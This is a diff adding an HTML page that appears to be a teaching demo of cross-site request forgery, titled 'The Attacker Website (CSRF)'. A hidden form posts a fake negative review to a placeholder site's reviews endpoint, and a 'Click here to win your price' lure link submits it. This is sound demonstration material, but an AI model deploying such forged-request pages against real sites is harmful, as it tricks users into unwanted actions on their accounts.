@@ -1,0 +1,21 @@
+<html lang=en>
+  <head>
+    <meta charset=utf-8>
+    <title>The Attacker Website</title>
+    <link rel="stylesheet" type="text/css" href="css/styles.css"/>
+    <style>
+      body {
+        border: 10px solid red
+      }
+    </style>
+  </head>
+  <body>
+    <h1>The Attacker Website (CSRF)</h1>
+    <section>
+        <form method="post" action="https://goodwebsite.com:8443/reviews">
+          <input name="newReview" type="hidden" value="This is actually a horrible movie - bad actor (😈)"></input>
+      </form>
+    </section>
+    <a href="#" onclick="document.forms[0].submit()"> 🎉 Click here to win your price 🎉</a>
+  </body>
+</html>
